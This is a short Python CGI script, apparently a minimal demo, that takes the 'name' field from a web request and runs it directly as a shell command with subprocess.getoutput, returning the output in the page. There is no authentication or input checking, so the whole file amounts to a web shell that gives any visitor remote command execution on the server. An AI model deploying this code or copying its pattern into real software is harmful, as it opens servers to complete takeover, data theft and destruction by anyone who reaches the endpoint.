#!/usr/bin/python3

print("content-type: text/html")
print()	


import cgi
import subprocess

form=cgi.FieldStorage()
a=form.getvalue("name")


print("<h1>OK</h1>")
print(subprocess.getoutput(a))




